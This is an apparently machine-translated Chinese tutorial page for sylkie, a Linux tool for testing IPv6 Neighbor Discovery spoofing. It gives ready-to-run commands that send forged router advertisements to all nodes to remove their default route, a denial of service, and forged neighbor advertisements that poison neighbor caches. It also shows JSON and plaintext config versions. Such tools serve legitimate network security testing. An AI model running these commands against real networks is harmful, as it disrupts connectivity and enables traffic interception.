# syl kie–使用邻居发现协议的 IPv6 地址欺骗

> 原文：<https://kalilinuxtutorials.com/sylkie-ipv6-address-spoofing/>

Sylkie 是一个命令行设备和库，用于测试使用邻居发现协议的 IPv6 系统中的正常地址欺骗安全漏洞。这项事业仍处于早期发展阶段。万一你继续遇到任何问题，请考虑提出一个问题。它目前只是继续在 Linux 上运行。

## **建造西尔基**

获取代码并编译它！

```
# Get the code
git clone https://github.com/dlrobertson/sylkie
cd ./sylkie

# Compile the code
mkdir -p ./build
cd ./build
cmake -DCMAKE_BUILD_TYPE=Release ..
make
make install
```

**也读作[FireMaster——火狐主密码恢复工具](https://kalilinuxtutorials.com/firemaster-password-recovery-tool/)**

## **基本用法**

下面介绍 sylkie 的基本用法。运行 sylkie -h 或`sylkie <subcommand> -h`以获得更多细节，或者查看高级用法以获得更多示例。

**注意:** sylkie 使用原始套接字发送伪造的广告。因此，可执行文件必须设置 setuid 位，或者必须以 root 用户身份运行。

## **【DoS(路由器广告)**

router-advert 命令的基本用法如下所示。该命令将向给定 ip 或所有节点多播地址发送路由器广告消息，使目标节点从其默认路由列表中删除`<router-ip>/<prefix>`。

```
sylkie ra -i <interface> \
--target-mac <mac of router> \
--router-ip <ip of router> \
--prefix <router prefix> \
--timeout <time between adverts> \
--repeat <number of times to send the request>
```

#### **路由器广告示例**

```
sylkie ra -i ens3 \
--target-mac 52:54:00:e3:f4:06 \
--router-ip fe80::b95b:ee1:cafe:9720 \
--prefix 64 \
--repeat -1 \
--timeout 10
```

这将向链路本地范围所有节点地址 ff02::1 发送“伪造的”路由器广告，导致所有节点从它们的默认路由列表中删除 fe80::b95b:ee1:cafe:9720/64(链路层地址 52:54:00:e3:f4:06)。

## **【邻居广告】地址欺骗**

sylkie neighbor advert 命令的基本用法如下所示。该命令将向给定的 ip 发送伪造的邻居通告消息。

```
sylkie na -i <interface> \
--dst-mac <dest hw addr> \
--src-ip <source ip> \
--dst-ip <dest ip address> \
--target-ip <target ip address> \
--target-mac <target mac address> \
--timeout <time betweeen adverts> \
--repeat <number of times to send the request>
```

#### **邻居广告示例**

```
sylkie na -i ens3 \
--dst-mac 52:54:00:e3:f4:06 \
--src-ip fe80::61ad:fda3:3032:f6f4 \
--dst-ip fe80::b95b:ee1:cafe:9720 \
--target-ip fe80::61ad:fda3:3032:f6f4 \
--target-mac 52:54:00:c2:a7:7c \
--repeat -1 \
--timeout 3
```

这将向 dst-IP(fe80::b95b:ee1:cafe:9720)发送一个“伪造的”邻居公告消息，导致 target-IP(fe80::61ad:FD a3:3032:f6f 4)的邻居缓存中的硬件地址更新为 target-mac (52:54:00:c2:a7:7c)。

### **JSON**

子命令(router-advert，neighbor-advert)是一个关键字，其值是一个对象数组，关键字和值是相应的选项和值。要运行该命令，请将 json 文件的路径作为参数传递给-j 选项。

#### **例子**

要从 json 运行上面提供的 router-advert 示例，首先创建一个包含以下内容的文件。

```
{
    "router-advert": [
        {
            "interface": "ens3",
            "target-mac": "52:54:00:e3:f4:06",
            "router-ip": "fe80::b95b:ee1:cafe:9720",
            "prefix": 64,
            "repeat": -1,
            "timeout": 10
        }
    ]
}
```

**创建文件后，开始发送包含以下内容的广告。**

```
sylkie -j /path/to/json
```

### **明文**

该文件的每一行都必须与您通过命令行提供的内容完全一致，不包括 sylkie 命令。

#### **例子**

要从 json 运行上面提供的 neighbor-advert 示例，首先创建一个包含以下内容的文件。

```
na -i ens3 --dst-mac 52:54:00:e3:f4:06 --src-ip fe80::61ad:fda3:3032:f6f4 --dst-ip fe80::b95b:ee1:cafe:9720 --target-ip fe80::61ad:fda3:3032:f6f4 --target-mac 52:54:00:c2:a7:7c --repeat -1 --timeout 3
```

**创建文件后，使用**开始发送广告

```
sylkie -x /path/to/file
```

[![](img/d861a9096555aeb1980fc054015933d7.png)](https://github.com/dlrobertson/sylkie)